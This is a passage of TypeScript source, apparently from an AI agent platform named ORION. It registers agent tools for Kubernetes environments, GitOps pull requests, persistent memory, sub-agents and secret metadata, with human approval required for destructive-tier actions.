  description: 'Validate Kubernetes manifest files against the cluster\'s actual API resources. Checks each document\'s apiVersion/kind against built-in Kubernetes resources and installed CRDs. Returns a pass/fail report. Call this before gitops_propose whenever manifests use non-standard apiVersions.',
  inputSchema: {
    type: 'object',
    properties: {
      files: {
        type: 'array',
        description: 'Array of manifest files to validate.',
        items: {
          type: 'object',
          properties: {
            path:    { type: 'string', description: 'File path (for display in the report)' },
            content: { type: 'string', description: 'Full YAML content of the file' },
          },
          required: ['path', 'content'],
        },
      },
    },
    required: ['files'],
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'gitops',
  handler: handleValidateManifest,
})


registerTool({
  name: 'orion_cluster_health',
  description: 'Comprehensive health check across all ORION-managed systems: (1) all enabled IngressRoutes — HTTP reachability and SSL cert validity; (2) Kubernetes cluster node readiness and pod issues (CrashLoopBackOff, OOMKilled, Failed, Pending); (3) all registered environment gateways; (4) ORION system services (Gitea, Vault, ORION itself). Each degraded item includes a canonical taskKey field — pass this as dedup_key when calling orion_create_task to prevent duplicate fix tasks.',
  inputSchema: {
    type: 'object',
    properties: {
      namespace: { type: 'string', description: 'Limit check to a specific namespace (optional — omit to check all namespaces)' },
    },
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'environment',
  handler: handleClusterHealth,
})

registerTool({
  name: 'orion_request_tool_grant',
  description: 'Request explicit authorization to call a destructive-tier tool. Creates an approval request that a human admin must review in the ORION UI (Administration → Approvals). Once approved, a one-time grant is created and the next call to the tool will succeed. Use this when a tool call was denied with "destructive tool requires explicit authorization".',
  inputSchema: {
    type: 'object',
    properties: {
      tool_name: { type: 'string', description: 'Exact name of the destructive tool being requested (e.g. "orion_archive_agent")' },
      reason:    { type: 'string', description: 'Why this destructive tool is needed for the current task — be specific' },
    },
    required: ['tool_name', 'reason'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'tools',
  handler: handleRequestToolGrant,
})

registerTool({
  name: 'orion_get_environment',
  description: 'Get the configuration and status of an ORION environment, including whether kubeconfig is stored.',
  inputSchema: {
    type: 'object',
    properties: {
      environment_id: { type: 'string', description: 'Environment ID' },
    },
    required: ['environment_id'],
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'chat',
  category: 'environment',
  handler: async (args, ctx) => {
    try {
      const { environment_id } = parseArgs(args) as { environment_id?: string }
      if (!environment_id) return 'Error: environment_id is required'
      const env = await ctx.prisma.environment.findFirst({
        where: { OR: [{ id: environment_id }, { name: { equals: environment_id, mode: 'insensitive' } }] },
      })
      if (!env) return `Error: environment "${environment_id}" not found`
      const e = env as Record<string, unknown>
      return JSON.stringify({
        id:               env.id,
        name:             env.name,
        type:             env.type,
        status:           env.status,
        gatewayUrl:       env.gatewayUrl,
        kubeconfig:       env.kubeconfig ? '••••' : null,
        gitOwner:         env.gitOwner,
        gitRepo:          env.gitRepo,
        repoPath:         e.repoPath        ?? null,
        vaultPathPrefix:  e.vaultPathPrefix ?? null,
        _conventions: {
          manifests:    e.repoPath        ? `Files go in: ${e.repoPath}/<service>/` : 'not set — ask a human',
          vaultSecrets: e.vaultPathPrefix ? `Secrets go at: secret/${e.vaultPathPrefix}/<service>` : 'not set — ask a human',
        },
      }, null, 2)
    } catch (e) {
      return `Error: ${e instanceof Error ? e.message : String(e)}`
    }
  },
})

registerTool({
  name: 'orion_patch_environment',
  description: 'Update fields on an ORION environment (e.g. save kubeconfig, update gatewayUrl). Requires a ToolExecutionGrant because kubeconfig writes grant cluster admin to whoever controls the kubeconfig.',
  inputSchema: {
    type: 'object',
    properties: {
      environment_id: { type: 'string', description: 'Environment ID' },
      body:           { type: 'object', description: 'Fields to update, e.g. {"kubeconfig": "<base64>"}' },
    },
    required: ['environment_id', 'body'],
  },
  // Upgraded from 'write' to 'destructive': kubeconfig is in the allowed fields
  // and writing cluster credentials is equivalent to gaining cluster admin. Any
  // agent calling this must have a one-time ToolExecutionGrant from an operator.
  tier: 'destructive',
  parallelSafe: false,
  availableIn: 'chat',
  category: 'environment',
  handler: async (args, ctx) => {
    try {
      const { environment_id, body } = parseArgs(args) as { environment_id?: string; body?: Record<string, unknown> }
      if (!environment_id) return 'Error: environment_id is required'
      if (!body || typeof body !== 'object') return 'Error: body must be an object'

      const ALLOWED = ['kubeconfig', 'gatewayUrl', 'gitOwner', 'gitRepo', 'description', 'repoPath', 'vaultPathPrefix']
      const update: Record<string, unknown> = {}
      for (const key of ALLOWED) {
        if (key in body) update[key] = body[key]
      }
      if (!Object.keys(update).length) return 'Error: no patchable fields provided'

      const target = await ctx.prisma.environment.findFirst({
        where: { OR: [{ id: environment_id }, { name: { equals: environment_id, mode: 'insensitive' } }] },
      })
      if (!target) return `Error: environment "${environment_id}" not found`
      await ctx.prisma.environment.update({ where: { id: target.id }, data: update })
      return `Environment "${target.name}" updated: ${Object.keys(update).join(', ')}`
    } catch (e) {
      return `Error: ${e instanceof Error ? e.message : String(e)}`
    }
  },
})

registerTool({
  name: 'knowledge_remember',
  description: 'Save an important fact, decision, or learned pattern to your persistent agent memory. It will be injected into your context on every future turn so you can recall it without tool calls. Use for: namespace locations, cluster quirks, decisions made, operator configurations, etc.',
  inputSchema: {
    type: 'object' as const,
    properties: {
      key:     { type: 'string', description: 'Short descriptive title (e.g. "tailscale-operator-namespace", "cluster-quirk-no-gpu")' },
      value:   { type: 'string', description: 'The fact or insight to remember' },
      context: { type: 'string', description: 'Why this is important (optional)' },
    },
    required: ['key', 'value'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'knowledge',
  handler: async (args, ctx) => {
    const { key, value, context: ctx2 } = parseArgs(args) as { key?: string; value?: string; context?: string }
    if (!key?.trim())   return 'Error: key is required'
    if (!value?.trim()) return 'Error: value is required'

    // Prefer agent-scoped knowledge (surfaced on every turn via buildAgentLocalContext)
    if (ctx.agentId) {
      const content = ctx2 ? `${value.trim()}\n\nContext: ${ctx2}` : value.trim()
      await ctx.prisma.agentKnowledge.upsert({
        where:  { agentId_title: { agentId: ctx.agentId, title: key.trim() } },
        update: { content, updatedAt: new Date() },
        create: { agentId: ctx.agentId, title: key.trim(), content, type: 'note' },
      })
      return `Remembered: [${key.trim()}] ${value.trim()}`
    }

    // Fallback: room-scoped knowledge when no agentId (shouldn't happen in normal room chat)
    if (ctx.roomId) {
      const content = ctx2 ? `${value.trim()}\n\nContext: ${ctx2}` : value.trim()
      await ctx.prisma.roomKnowledge.upsert({
        where:  { roomId_title: { roomId: ctx.roomId, title: key.trim() } },
        update: { content, updatedAt: new Date() },
        create: { roomId: ctx.roomId, title: key.trim(), content, type: 'note' },
      })
      return `Remembered (room-scoped): [${key.trim()}] ${value.trim()}`
    }

    return 'Error: no agentId or roomId in context — cannot persist memory.'
  },
})

registerTool({
  name: 'orion_bootstrap_environment',
  description: 'Trigger the bootstrap process for a Kubernetes cluster environment. Deploys ArgoCD and ORION Gateway into the cluster.',
  inputSchema: {
    type: 'object',
    properties: {
      environment_id: { type: 'string', description: 'Environment ID' },
    },
    required: ['environment_id'],
  },
  tier: 'destructive',
  parallelSafe: false,
  availableIn: 'chat',
  category: 'environment',
  handler: async (args, ctx) => {
    try {
      const { environment_id } = parseArgs(args) as { environment_id?: string }
      if (!environment_id) return 'Error: environment_id is required'

      const env = await ctx.prisma.environment.findFirst({
        where: { OR: [{ id: environment_id }, { name: { equals: environment_id, mode: 'insensitive' } }] },
      })
      if (!env) return `Error: environment "${environment_id}" not found`
      if (!env.kubeconfig) return 'Error: no kubeconfig stored for this environment. Patch it first using orion_patch_environment.'
      if (env.status === 'connected') return `Environment "${env.name}" is already connected (status: connected). Bootstrapping again would re-deploy the gateway unnecessarily. To force re-bootstrap, first set status to 'pending' via orion_patch_environment.`

      // Check for an already-running or queued bootstrap job (idempotency guard)
      const existingJob = await ctx.prisma.backgroundJob.findFirst({
        where: {
          type: 'cluster-bootstrap',
          metadata: { path: ['environmentId'], equals: env.id },
          status: { in: ['queued', 'running'] },
        },
        select: { id: true, status: true },
      })
      if (existingJob) {
        return `Error: a bootstrap job is already ${existingJob.status} for environment "${env.name}" (job: ${existingJob.id}). Wait for it to complete before starting another.`
      }

      // x-internal-call header was never checked in middleware — the bootstrap
      // self-call always failed because /api/environments is a BEARER_PATH that
      // requires Authorization: Bearer. Use ORION_GATEWAY_TOKEN or ORION_MCP_TOKEN.
      const serviceToken = process.env.ORION_GATEWAY_TOKEN ?? process.env.ORION_MCP_TOKEN ?? ''
      if (!serviceToken) return 'Error: no service token configured (ORION_GATEWAY_TOKEN or ORION_MCP_TOKEN required)'
      const baseUrl = process.env.ORION_CALLBACK_URL ?? `http://localhost:${process.env.PORT ?? 3000}`
      const res = await fetch(`${baseUrl}/api/environments/${env.id}/bootstrap`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${serviceToken}`,
        },
      })
      if (!res.ok) return `Bootstrap request failed: HTTP ${res.status}`

      const reader = res.body?.getReader()
      if (!reader) return 'Bootstrap started (no stream output)'
      const decoder = new TextDecoder()
      const lines: string[] = []
      let done = false
      while (!done) {
        const { value, done: d } = await reader.read()
        done = d
        if (value) {
          const chunk = decoder.decode(value, { stream: true })
          for (const line of chunk.split('\n')) {
            if (!line.startsWith('data: ')) continue
            try {
              const evt = JSON.parse(line.slice(6)) as { type: string; message?: string }
              if (evt.message) lines.push(`[${evt.type}] ${evt.message}`)
            } catch { /* skip */ }
          }
        }
      }
      return lines.length ? lines.join('\n') : 'Bootstrap completed (no output captured)'
    } catch (e) {
      return `Error: ${e instanceof Error ? e.message : String(e)}`
    }
  },
})

// ── spawn_agent ───────────────────────────────────────────────────────────────

const MAX_SUBAGENT_RESULT_CHARS = 12_000
const SUBAGENT_DEPTH_KEY = '__subagent_depth'

registerTool({
  name: 'spawn_agent',
  description: `Run an ephemeral sub-agent in-process and return its output as a string.

Use this when the current task needs to delegate a focused sub-problem to a separate agent loop — for example, to gather information, draft content, or execute a short specialised workflow — without creating a new Task in the database or waiting for the worker poll cycle.

The sub-agent runs with the same gateway/environment connection as the parent, inherits management tools, and uses the same or an overridden model. Results are returned synchronously to the caller.

Guidelines:
- Keep prompts concise and focused on a single outcome
- Prefer this over orion_create_task when you need the answer immediately
- Do NOT spawn sub-agents recursively — depth is capped at 1`,
  inputSchema: {
    type: 'object',
    properties: {
      prompt: {
        type: 'string',
        description: 'The task/question for the sub-agent to answer or complete',
      },
      system_prompt: {
        type: 'string',
        description: 'Optional system prompt override. Defaults to the parent agent\'s system prompt.',
      },
      model: {
        type: 'string',
        description: 'Optional model ID override (e.g. "claude:claude-haiku-4-5-20251001"). Defaults to parent agent\'s model.',
      },
      max_turns: {
        type: 'number',
        description: 'Maximum tool-calling turns (default 8, max 15)',
      },
    },
    required: ['prompt'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'task',
  category: 'agents',
  handler: async (args, ctx) => {
    // Guard against recursive spawning
    const depth = ((ctx as any)[SUBAGENT_DEPTH_KEY] ?? 0) as number
    if (depth >= 1) {
      return 'Error: spawn_agent cannot be called recursively (max depth 1)'
    }

    const {
      prompt,
      system_prompt: systemPromptOverride,
      model: modelOverride,
      max_turns: maxTurnsArg,
    } = parseArgs(args) as {
      prompt?: string
      system_prompt?: string
      model?: string
      max_turns?: number
    }

    if (!prompt?.trim()) return 'Error: prompt is required'

    const maxTurns = Math.min(maxTurnsArg ?? 8, 15)

    try {
      // Lazy import to avoid circular dependency (openai-runner imports tool-registry)
      const { createRunner } = await import('@/lib/agent-runner')
      const { MANAGEMENT_TOOL_DEFS, executeManagedTool } = await import('@/lib/management-tools')

      // Resolve model: arg override → parent agent's model → system default
      let modelId = modelOverride ?? null
      let systemPrompt = systemPromptOverride ?? 'You are a helpful assistant.'

      if (ctx.agentId && (!modelId || !systemPromptOverride)) {
        const agent = await ctx.prisma.agent.findUnique({
          where: { id: ctx.agentId },
          select: { metadata: true },
        })
        if (agent) {
          const meta          = (agent.metadata ?? {}) as Record<string, unknown>
          const contextConfig = (meta.contextConfig ?? {}) as Record<string, unknown>
          if (!modelId) {
            const llm = contextConfig.llm as string | undefined
            if (llm) modelId = llm.startsWith('claude:') || llm.startsWith('ollama:') || llm.startsWith('ext:')
              ? llm
              : `ext:${llm}`
          }
          if (!systemPromptOverride) {
            systemPrompt = (meta.systemPrompt as string | undefined) ?? systemPrompt
          }
        }
      }

      modelId = modelId ?? await getDefaultModelId()

      // Resolve gateway from environment if available
      let gateway: { url: string; token: string } | null = null
      if (ctx.environmentId) {
        const { resolveAgentGateway } = await import('@/lib/agent-gateway')
        const agentGw = ctx.agentId ? await resolveAgentGateway(ctx.agentId) : null
        if (agentGw) gateway = { url: agentGw.url, token: agentGw.token }
      }

      const subCtx = {
        taskId:          `subagent-${Date.now()}`,
        taskTitle:       prompt.slice(0, 80),
        taskDescription: null,
        taskPlan:        null,
        agentId:         ctx.agentId ?? 'subagent',
        agentName:       'sub-agent',
        systemPrompt,
        modelId,
        gateway,
        environmentId:   ctx.environmentId,
        managementTools: {
          definitions: MANAGEMENT_TOOL_DEFS,
          execute: (name: string, argsRaw: string) =>
            executeManagedTool(name, argsRaw, ctx.agentId),
        },
        // Internal: track recursion depth so nested spawn_agent calls are blocked
        [SUBAGENT_DEPTH_KEY]: depth + 1,
      }

      const runner = createRunner(modelId)

      // Cap turns by temporarily patching the context (runners read MAX_TURNS internally,
      // but we pass maxTurns in the context for runners that respect it in future)
      ;(subCtx as any).__maxTurns = maxTurns

      let result = ''
      for await (const event of runner.run(subCtx as any)) {
        if (event.type === 'text') result += event.content
        if (event.type === 'error') return `Sub-agent error: ${event.error}`
        if (event.type === 'done') break
      }

      if (result.length > MAX_SUBAGENT_RESULT_CHARS) {
        result = result.slice(0, MAX_SUBAGENT_RESULT_CHARS) + `\n\n[result truncated at ${MAX_SUBAGENT_RESULT_CHARS} chars]`
      }

      return result || '(sub-agent produced no text output)'
    } catch (e) {
      return `Error running sub-agent: ${e instanceof Error ? e.message : String(e)}`
    }
  },
})

// ── gitops_propose ────────────────────────────────────────────────────────────

registerTool({
  name: 'gitops_propose',
  description: `Propose a GitOps change. Creates a branch, commits files, opens a PR in the environment's git repo, and auto-merges if policy allows. Use this for ALL cluster/infrastructure changes — never apply kubectl manifests directly.

BEFORE proposing: call gitops_ls to check what paths already exist so you match the existing structure exactly.

Path conventions: pass service-relative paths (e.g. "tailscale/deployment.yaml") — the tool automatically prepends the correct watched directory (e.g. "deployments/"). Paths that escape the watched directory are REJECTED.

To delete files: set delete: true on the change item and omit content. You can mix deletions and upserts in a single PR (e.g. remove an old service and add a replacement atomically).

For Kubernetes manifests: always include namespace, use pinned image tags, include CrowdSec + Authentik middleware on all public ingresses.
For Docker Compose: use self-contained services (no host bind mounts for config files).`,
  inputSchema: {
    type: 'object',
    properties: {
      environment_id:        { type: 'string', description: 'Environment ID or name (e.g. "Talos Cluster", "localhost")' },
      title:                 { type: 'string', description: 'Short PR title, e.g. "feat: deploy Tailscale Operator"' },
      reasoning:             { type: 'string', description: 'Why this change is needed' },
      operation_description: { type: 'string', description: 'Plain-language summary: e.g. "add new service", "update image tag", "remove service"' },
      changes: {
        type: 'array',
        items: {
          type: 'object',
          properties: {
            path:    { type: 'string', description: 'Service-relative file path — do NOT include the watched directory prefix. E.g. "tailscale/deployment.yaml", not "deployments/tailscale/deployment.yaml". The tool places it under the correct directory automatically.' },
            content: { type: 'string', description: 'Full file content. Required unless delete is true.' },
            delete:  { type: 'boolean', description: 'Set to true to delete this file from the repo. Omit content when deleting.' },
          },
          required: ['path'],
        },
      },
    },
    required: ['environment_id', 'title', 'reasoning', 'operation_description', 'changes'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'gitops',
  handler: async (args, ctx) => {
    const { environment_id, title, reasoning, operation_description, changes } =
      args as { environment_id?: string; title?: string; reasoning?: string; operation_description?: string; changes?: Array<{ path: string; content?: string; delete?: boolean }> }

    if (!environment_id || !title || !reasoning || !operation_description || !changes?.length) {
      return 'Error: environment_id, title, reasoning, operation_description, and changes are all required'
    }
    const invalid = changes.filter(c => !c.delete && !c.content)
    if (invalid.length > 0) {
      return `Error: the following changes are missing content (set delete: true to delete a file, or provide content to upsert):\n${invalid.map(c => `  - ${c.path}`).join('\n')}`
    }
    try {
      const { proposeChange } = await import('@/lib/gitops')
      const env = await prisma.environment.findFirst({
        where: { OR: [{ id: environment_id }, { name: { equals: environment_id, mode: 'insensitive' } }] },
      })
      if (!env) return `Error: environment "${environment_id}" not found`
      if (!env.gitOwner || !env.gitRepo) return 'Error: environment has no git repo configured — run bootstrap first'

      // Enforce repoPath convention — prepend if agent passed service-relative paths
      const repoPath = (env as Record<string, unknown>).repoPath as string | undefined
      const normalizedChanges = repoPath
        ? changes.map(c => ({
            ...c,
            path: c.path.startsWith(`${repoPath}/`) ? c.path : `${repoPath}/${c.path}`,
          }))
        : changes as Array<{ path: string; content?: string; delete?: boolean }>

      if (repoPath) {
        const escaping = normalizedChanges.filter(c => !c.path.startsWith(`${repoPath}/`))
        if (escaping.length > 0) {
          return `Error: the following paths fall outside the watched directory "${repoPath}/". Pass service-relative paths only (e.g. "tailscale/deployment.yaml"):\n${escaping.map(c => `  - ${c.path}`).join('\n')}\n\nCall gitops_ls first to check existing structure.`
        }
      }

      const policy = (env.policyConfig ?? {}) as import('@/lib/gitops-policy').PolicyConfig
      const result = await proposeChange({
        owner: env.gitOwner,
        repo: env.gitRepo,
        title,
        reasoning,
        operationDescription: operation_description,
        changes: normalizedChanges,
        policy,
      })

      await prisma.gitOpsPR.create({
        data: {
          environmentId: env.id,
          prNumber:  result.prNumber,
          title,
          operation: result.classification.operation,
          decision:  result.classification.decision,
          status:    result.merged ? 'merged' : 'open',
          prUrl:     result.prUrl,
          reasoning,
          branch:    result.branch,
          mergedAt:  result.merged ? new Date() : null,
        },
      })

      const action = result.merged
        ? `auto-merged (${result.classification.reason})`
        : `opened for review — ${result.classification.reason}`
      await auditLog(ctx.agentId ?? ctx.userId, `📦 GitOps PR #${result.prNumber} ${action} in ${env.gitOwner}/${env.gitRepo}: "${title}"`)
      return `PR #${result.prNumber} ${action}. URL: ${result.prUrl}`
    } catch (e) {
      return `Error proposing GitOps change: ${e instanceof Error ? e.message : String(e)}`
    }
  },
})

// ── gitea_merge_pr ────────────────────────────────────────────────────────────

registerTool({
  name: 'gitea_merge_pr',
  description: 'Merge an open Gitea pull request into its target branch. The PR must be in a mergeable state.',
  inputSchema: {
    type: 'object',
    properties: {
      environment_id: { type: 'string', description: 'Environment ID or name (e.g. "Talos Cluster")' },
      pr_number:      { type: 'number', description: 'The PR number to merge' },
      merge_message:  { type: 'string', description: 'Optional commit message for the merge commit' },
    },
    required: ['environment_id', 'pr_number'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'gitops',
  handler: handleMergePR,
})

// ── gitea_close_pr ────────────────────────────────────────────────────────────

registerTool({
  name: 'gitea_close_pr',
  description: 'Close an open Gitea pull request without merging it. Use this to clean up duplicate, superseded, or unwanted PRs.',
  inputSchema: {
    type: 'object',
    properties: {
      environment_id: { type: 'string', description: 'Environment ID or name (e.g. "Talos Cluster")' },
      pr_number:      { type: 'number', description: 'The PR number to close' },
      reason:         { type: 'string', description: 'Short reason for closing (e.g. "superseded by PR #95")' },
    },
    required: ['environment_id', 'pr_number'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'gitops',
  handler: handleClosePR,
})

// ── propose_tool ──────────────────────────────────────────────────────────────

registerTool({
  name: 'propose_tool',
  description: "Propose a new MCP tool for admin review. Use this when you need a capability that isn't in your current tool list. The admin will be notified to approve or reject the proposal.",
  inputSchema: {
    type: 'object',
    properties: {
      name:        { type: 'string', description: 'snake_case tool name' },
      description: { type: 'string', description: 'Clear one-sentence description of what the tool does' },
      inputSchema: { type: 'object', description: 'JSON Schema for the tool inputs (type: object, properties, required)' },
      execType:    { type: 'string', enum: ['shell', 'http', 'builtin'], description: 'How the tool is executed' },
      execConfig:  { type: 'object', description: 'Execution config: shell={command}, http={url,method}' },
      environment_id: { type: 'string', description: 'Environment to associate the tool with (optional — inferred from context if omitted)' },
    },
    required: ['name', 'description', 'inputSchema'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'tools',
  handler: async (args, ctx) => {
    const { name, description, inputSchema: schema, execType, execConfig, environment_id } =
      args as { name?: string; description?: string; inputSchema?: object; execType?: string; execConfig?: object; environment_id?: string }

    if (!name || !description || !schema) {
      return 'Error: propose_tool requires name, description, and inputSchema'
    }

    const envId = environment_id ?? ctx.environmentId
    if (!envId) return 'Error: no environment context — pass environment_id explicitly'

    const existing = await ctx.prisma.mcpTool.findFirst({ where: { environmentId: envId, name } })
    if (existing) return `Tool "${name}" already exists (status: ${existing.status}).`

    await ctx.prisma.mcpTool.create({
      data: {
        environmentId: envId,
        name,
        description,
        inputSchema: schema as object,
        execType: (execType as string) || 'shell',
        execConfig: execConfig as object | undefined,
        enabled: false,
        builtIn: false,
        status: 'pending',
        proposedBy: ctx.agentId,
        proposedAt: new Date(),
      },
    })

    return `Tool "${name}" proposed successfully. An admin will review and approve it from Administration → Environments → Approvals.`
  },
})

// ── knowledge_search ──────────────────────────────────────────────────────────

registerTool({
  name: 'knowledge_search',
  description: 'Semantically search the knowledge base (notes, runbooks, wiki pages) for content relevant to a query. Returns notes ranked by similarity.',
  inputSchema: {
    type: 'object',
    properties: {
      query:          { type: 'string',  description: 'Natural language search query' },
      limit:          { type: 'number',  description: 'Max results to return (1-20, default 5)' },
      includeContent: { type: 'boolean', description: 'Whether to include full note content (default true)' },
    },
    required: ['query'],
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'knowledge',
  handler: async (args) => {
    const { query, limit = 5, includeContent = true } =
      args as { query?: string; limit?: number; includeContent?: boolean }
    if (!query) return 'Error: query is required'

    const embedding = await generateEmbedding(query.slice(0, 2000))
    if (!embedding) return 'No embedding provider configured. Add an embedding model in Admin → Models to enable semantic search.'

    const results = await vectorSearch(embedding.vector, Math.min(limit, 20))
    if (!results.length) return 'No relevant notes found for this query.'

    return JSON.stringify(
      results.map((r: any) => ({
        title:  r.title,
        type:   r.type,
        folder: r.folder,
        score:  parseFloat(r.score.toFixed(3)),
        ...(includeContent && { content: r.content.slice(0, 2000) }),
      })),
      null, 2
    )
  },
})

// ── knowledge_graph ───────────────────────────────────────────────────────────

registerTool({
  name: 'knowledge_graph',
  description: 'Get the full knowledge graph — all notes with their types, wikilink dependencies, and semantic connections. Use this to understand what documentation exists and how topics relate.',
  inputSchema: {
    type: 'object',
    properties: {
      threshold:      { type: 'number',  description: 'Minimum similarity score for semantic edges (0.0-1.0, default 0.5)' },
      includeContent: { type: 'boolean', description: 'Include a short content snippet per note (default false)' },
    },
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'knowledge',
  handler: async (args) => {
    const { threshold = 0.5, includeContent = false } =
      args as { threshold?: number; includeContent?: boolean }

    const [notes, semanticEdges] = await Promise.all([
      prisma.note.findMany({
        select: { id: true, title: true, type: true, folder: true, content: true },
        orderBy: { title: 'asc' },
      }),
      prisma.semanticConnection.findMany({
        where: { score: { gte: threshold } },
        select: { sourceNoteId: true, targetNoteId: true, score: true },
        orderBy: { score: 'desc' },
        take: 200,
      }),
    ])

    const noteByTitle = new Map(notes.map((n: any) => [n.title.toLowerCase(), n.title]))
    const wikilinkEdges: Array<{ from: string; to: string }> = []
    const wikilinkRegex = /\[\[([^\]|#]+)(?:[|#][^\]]+)?\]\]/g
    for (const note of notes) {
      for (const match of (note as any).content.matchAll(wikilinkRegex)) {
        const target = match[1].trim()
        if (noteByTitle.has(target.toLowerCase()) && target.toLowerCase() !== (note as any).title.toLowerCase()) {
          wikilinkEdges.push({ from: (note as any).title, to: target })
        }
      }
    }

    const nodeLines = notes.map((n: any) => {
      const tag = n.type !== 'note' ? ` [${n.type}]` : ''
      const folder = n.folder ? ` (${n.folder})` : ''
      const snippet = includeContent ? `\n  ${n.content.slice(0, 200).replace(/\n/g, ' ')}` : ''
      return `- ${n.title}${tag}${folder}${snippet}`
    })

    const wikiLines = wikilinkEdges.map((e: any) => `  ${e.from} → ${e.to}`)
    const noteById = new Map(notes.map((n: any) => [n.id, n]))
    const semLines = semanticEdges
      .map((e: any) => {
        const src = (noteById.get(e.sourceNoteId) as any)?.title
        const tgt = (noteById.get(e.targetNoteId) as any)?.title
        return src && tgt ? `  ${src} ~${e.score.toFixed(2)}~ ${tgt}` : null
      })
      .filter(Boolean)

    return [
      `## Notes (${notes.length})\n${nodeLines.join('\n')}`,
      `\n## Wikilink Edges (${wikiLines.length})\n${wikiLines.join('\n') || '  none'}`,
      `\n## Semantic Edges (${semLines.length})\n${semLines.join('\n') || '  none'}`,
    ].join('\n')
  },
})

// ── knowledge_write ───────────────────────────────────────────────────────────

registerTool({
  name: 'knowledge_write',
  description: `Write a lesson, pattern, or finding to the shared knowledge base. Automatically embedded into the vector index so all agents can find it via knowledge_search.

Use this after completing or investigating any task. Structure content for maximum searchability:

  ## Context
  [When does this apply? What task/domain/service?]

  ## Problem
  [What went wrong, or what needed to be done?]

  ## Root Cause
  [Why did it happen?]

  ## Solution
  [Exact steps, commands, or approach that worked]

  ## Rules for Next Time
  - [Specific do/don't rules derived from this experience]`,
  inputSchema: {
    type: 'object',
    properties: {
      title:   { type: 'string', description: 'Short searchable title — include service/domain name and the key lesson. E.g. "Tailscale: namespace must exist before operator deploy"' },
      content: { type: 'string', description: 'Structured lesson — use the Context/Problem/Root Cause/Solution/Rules format for best search retrieval' },
      folder:  { type: 'string', description: '"Success Patterns" | "Failure Patterns" | "Cluster Quirks" | "Tool Usage" | "Agent Lessons" (default: "Agent Lessons")' },
      tags:    { type: 'array', items: { type: 'string' }, description: 'Domain tags for filtering, e.g. ["tailscale", "networking", "kubernetes"]' },
    },
    required: ['title', 'content'],
  },
  tier: 'write',
  parallelSafe: false,
  availableIn: 'both',
  category: 'knowledge',
  handler: async (args) => {
    const { title, content, folder = 'Agent Lessons', tags } =
      args as { title?: string; content?: string; folder?: string; tags?: string[] }

    if (!title?.trim()) return 'Error: title is required'
    if (!content?.trim()) return 'Error: content is required'

    const { embedNote } = await import('@/lib/embeddings')

    const existing = await prisma.note.findFirst({ where: { title: title.trim() } })

    let note: { id: string; title: string; content: string }
    if (existing) {
      note = await prisma.note.update({
        where: { id: existing.id },
        data: {
          content:   content.trim(),
          folder:    folder.trim(),
          tags:      tags ? tags : (existing.tags ?? undefined),
          updatedAt: new Date(),
        },
      })
    } else {
      note = await prisma.note.create({
        data: {
          title:   title.trim(),
          content: content.trim(),
          folder:  folder.trim(),
          type:    'note',
          tags:    tags ? tags as any : undefined,
        },
      })
    }

    // Embed immediately so the note is searchable via knowledge_search right away
    const embedded = await embedNote(note).catch(() => false)

    const action = existing ? 'updated' : 'written'
    return `Knowledge ${action}: "${note.title}" (id: ${note.id}, folder: ${folder}, embedded: ${embedded})`
  },
})

// ── Vault / Managed Secrets ───────────────────────────────────────────────────

async function handleListSecrets(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { environment, namespace, status, tag } = parseArgs(args) as {
    environment?: string
    namespace?: string
    status?: string
    tag?: string
  }

  let environmentId: string | undefined
  if (environment) {
    const env = await ctx.prisma.environment.findFirst({
      where: { name: { contains: environment, mode: 'insensitive' } },
      select: { id: true },
    })
    if (!env) return `Error: no environment matching "${environment}". Omit to list secrets from all environments.`
    environmentId = env.id
  }

  const secrets = await ctx.prisma.managedSecret.findMany({
    where: {
      ...(environmentId ? { environmentId } : {}),
      ...(namespace     ? { namespace }     : {}),
      ...(status        ? { status }        : {}),
    },
    include: { environment: { select: { name: true } } },
    orderBy: [{ environment: { name: 'asc' } }, { namespace: 'asc' }, { name: 'asc' }],
    take: 100,
  })

  const filtered = tag
    ? secrets.filter((s: any) => Array.isArray(s.tags) && s.tags.includes(tag))
    : secrets

  if (!filtered.length) return 'No managed secrets found matching the given filters.'

  return JSON.stringify(
    filtered.map((s: any) => ({
      id:             s.id,
      name:           s.name,                    // ExternalSecret / K8s Secret name
      environment:    s.environment.name,
      namespace:      s.namespace,
      description:    s.description ?? null,
      vaultPath:      s.remoteRef,               // Vault path — e.g. "secret/data/myapp/db"
      targetSecret:   s.targetSecretName ?? s.name,  // K8s Secret name to mount/reference
      // Only the K8s key names — how to reference this secret in pod specs / secretKeyRef.
      // Vault-internal key names are not exposed.
      k8sKeys:        (s.dataKeys as Array<{ secretKey: string }> ?? []).map(k => k.secretKey),
      refreshInterval: s.refreshInterval,
      status:         s.status,                  // "draft" | "applied" | "error"
      statusMessage:  s.status === 'error' ? (s.statusMessage ?? null) : null,
      tags:           s.tags ?? [],
      appliedAt:      s.appliedAt?.toISOString() ?? null,
    })),
    null, 2
  )
}

registerTool({
  name: 'orion_list_secrets',
  description: 'List Vault secrets registered in ORION as managed ExternalSecrets. Returns metadata only — Vault path, target K8s Secret name, the K8s key names you can reference in pod specs, and sync status. Never returns actual secret values or Vault-internal key names.',
  inputSchema: {
    type: 'object',
    properties: {
      environment: { type: 'string', description: 'Filter by environment name (partial match). Omit for all environments.' },
      namespace:   { type: 'string', description: 'Filter by Kubernetes namespace.' },
      status:      { type: 'string', description: 'Filter by sync status: draft, applied, error.' },
      tag:         { type: 'string', description: 'Filter by a single tag value.' },
    },
  },
  tier: 'read',
  parallelSafe: true,
  availableIn: 'both',
  category: 'secrets',
  handler: handleListSecrets,
})

registerTool({
  name: 'generate_secret',
